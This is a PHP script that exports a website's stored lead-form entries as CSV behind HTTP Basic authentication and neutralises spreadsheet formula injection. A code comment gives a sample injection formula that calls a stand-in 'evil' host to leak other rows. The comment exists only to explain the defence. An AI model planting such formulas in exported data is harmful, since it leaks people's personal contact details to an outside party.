<?php
// CSV export of stored leads: https://hollandsvastgoedfonds.com/api/leads.php
// The browser asks for a login: any username, password = export_key from
// config.php. HTTP Basic instead of ?key= so the key never lands in access
// logs, CDN logs or browser history.
declare(strict_types=1);
header_remove('X-Powered-By');
header('X-Robots-Tag: noindex');
header('Cache-Control: no-store, private');
$dataDir = dirname(__DIR__, 4) . '/hollands_data';
$cfg = is_file($dataDir . '/config.php') ? (array)(include $dataDir . '/config.php') : [];
$key = (string)($cfg['export_key'] ?? '');

$given = (string)($_SERVER['PHP_AUTH_PW'] ?? '');
$auth = (string)($_SERVER['HTTP_AUTHORIZATION'] ?? $_SERVER['REDIRECT_HTTP_AUTHORIZATION'] ?? '');
if ($given === '' && stripos($auth, 'basic ') === 0) {
    $given = explode(':', (string)base64_decode(substr($auth, 6)), 2)[1] ?? '';
}
if ($key === '' || !hash_equals($key, $given)) {
    header('WWW-Authenticate: Basic realm="Leads export", charset="UTF-8"');
    http_response_code(401);
    exit;
}

// Leads come from a public form. Excel/Sheets run a cell that starts with
// = + - @ (or tab/CR) as a formula, e.g. =HYPERLINK("https://evil/?"&F3) leaks
// other rows when clicked. Prefix such cells with ' so they stay plain text.
// Plain phone numbers like "+31 6 1234 5678" are left alone.
function csv_cell($v) {
    if (!is_string($v) || !preg_match('/^[=+\-@\t\r]/', $v)) return $v;
    if (preg_match('/^\+?[\d\s().\/-]+$/', $v)) return $v;
    return "'" . $v;
}

$db = new PDO('sqlite:' . $dataDir . '/leads.sqlite');
$rows = $db->query('SELECT * FROM leads ORDER BY id DESC')->fetchAll(PDO::FETCH_ASSOC);
$rows = array_map(function ($r) { unset($r['ip'], $r['user_agent']); return $r; }, $rows);
header('Content-Type: text/csv; charset=utf-8');
header('Content-Disposition: attachment; filename="leads-' . gmdate('Y-m-d') . '.csv"');
$out = fopen('php://output', 'w');
fwrite($out, "\xEF\xBB\xBF");
if ($rows) fputcsv($out, array_keys($rows[0]), ';');
foreach ($rows as $r) fputcsv($out, array_map('csv_cell', array_values($r)), ';');
